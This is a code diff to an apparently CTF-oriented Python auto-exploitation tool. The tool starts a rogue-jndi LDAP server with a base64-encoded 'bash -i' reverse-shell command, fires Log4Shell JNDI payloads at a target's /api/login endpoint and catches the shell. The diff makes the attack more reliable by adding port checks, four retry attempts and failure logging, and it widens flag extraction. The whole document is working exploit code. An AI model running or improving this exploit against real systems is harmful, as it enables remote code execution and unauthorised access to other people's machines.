@@ -24,6 +24,7 @@ import re
 import socket
 import ssl
 import subprocess
+import tempfile
 import threading
 import time
 import urllib.error
@@ -188,26 +189,55 @@ def _auto_exploit(host: HostReport, ip: str, att: str, port: int) -> None:
         utils.log("bad", f"could not bind :{_SHELL_PORT} for the reverse shell")
         return
 
+    if _port_listening("127.0.0.1", _LDAP_PORT):
+        utils.log("warn", f"something is already listening on :{_LDAP_PORT} — a "
+                          "stale rogue-jndi from a previous run may hijack this "
+                          "attempt; kill it (pkill -f RogueJndi) if the shell "
+                          "never lands")
     utils.log("info", f"starting rogue-jndi ({os.path.basename(jar)}) on "
                       f":{_LDAP_PORT}, hostname {att}")
+    log = tempfile.NamedTemporaryFile(
+        prefix="scryer_rogue_", suffix=".log", delete=False)
     rogue = subprocess.Popen(
         [java, "-jar", jar, "--command",
          f"bash -c {{echo,{b64}}}|{{base64,-d}}|{{bash,-i}}", "--hostname", att],
-        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        stdout=log, stderr=subprocess.STDOUT)
     try:
-        time.sleep(3)   # let the LDAP server come up
-        utils.log("info", f"firing JNDI payload at https://{ip}:{port}/api/login")
-        _fire_payload(ip, att, port)
-        if not catcher.wait(25):
-            utils.log("warn", "no reverse shell in 25s — the target may not route "
-                              f"to {att}; check your tun0 IP and re-run, or use "
-                              "the manual playbook")
+        # Wait for the LDAP server to actually bind before firing.
+        if not _wait_listening("127.0.0.1", _LDAP_PORT, 12) or \
+                rogue.poll() is not None:
+            log.flush()
+            utils.log("bad", f"rogue-jndi did not come up on :{_LDAP_PORT}")
+            _show_log(log.name)
+            return
+        # Fire repeatedly across the window: the first request warms up logging
+        # and the callback can lag a few seconds behind on a slow VPN.
+        got = False
+        for shot in range(4):
+            utils.log("info", f"firing JNDI payload at https://{ip}:{port}"
+                              f"/api/login (attempt {shot + 1})")
+            _fire_payload(ip, att, port)
+            if catcher.wait(12):
+                got = True
+                break
+        if not got:
+            utils.log("warn", "no reverse shell after 4 attempts (~48s) — usual "
+                              f"causes: the target can't route to {att} (wrong "
+                              "tun0 IP?), a host firewall is dropping inbound "
+                              f":{_SHELL_PORT}/:{_LDAP_PORT}, or a stale rogue-jndi "
+                              "served an old payload. rogue-jndi log:")
+            _show_log(log.name)
             return
         utils.log("hot", f"reverse shell caught from {ip} (Log4Shell RCE)")
         _post_shell(host, ip, port, catcher)
     finally:
         rogue.terminate()
         catcher.close()
+        try:
+            log.close()
+            os.unlink(log.name)
+        except OSError:
+            pass
 
 
 def _fire_payload(ip: str, att: str, port: int) -> None:
@@ -408,6 +438,37 @@ def _build_rogue_jndi() -> Optional[str]:
     return jar if os.path.isfile(jar) else None
 
 
+def _port_listening(host: str, port: int) -> bool:
+    """True if something is already accepting connections on host:port."""
+    try:
+        with socket.create_connection((host, port), timeout=1):
+            return True
+    except OSError:
+        return False
+
+
+def _wait_listening(host: str, port: int, timeout: float) -> bool:
+    """Block until host:port accepts a connection, or timeout elapses."""
+    end = time.time() + timeout
+    while time.time() < end:
+        if _port_listening(host, port):
+            return True
+        time.sleep(0.4)
+    return False
+
+
+def _show_log(path: str) -> None:
+    """Print the tail of the rogue-jndi log so a failure is diagnosable."""
+    try:
+        with open(path, "r", errors="replace") as fh:
+            lines = fh.read().splitlines()
+    except OSError:
+        return
+    for line in lines[-15:]:
+        if line.strip():
+            utils.log("dim", line[:160], indent=2)
+
+
 def _attacker_ip(target: str) -> str:
     """The source IP the target would see — prefer a tun/vpn interface."""
     try:
@@ -497,7 +558,7 @@ def _ssh_root_flag(ip: str, user: str, pw: str) -> str:
 
 def _grab_flags(host: HostReport, blob: str, source: str, port: int) -> None:
     from ...data import knowledge
-    for tok in knowledge.find_flags(blob or ""):
+    for tok in knowledge.find_flags(blob or "", allow_hex=True):
         bar = utils.c("╔" + "═" * 56, utils.C.GREEN, utils.C.BOLD)
         print("\n  " + bar)
         print("  " + utils.c(f"║ FLAG ({source})", utils.C.GREEN, utils.C.BOLD))
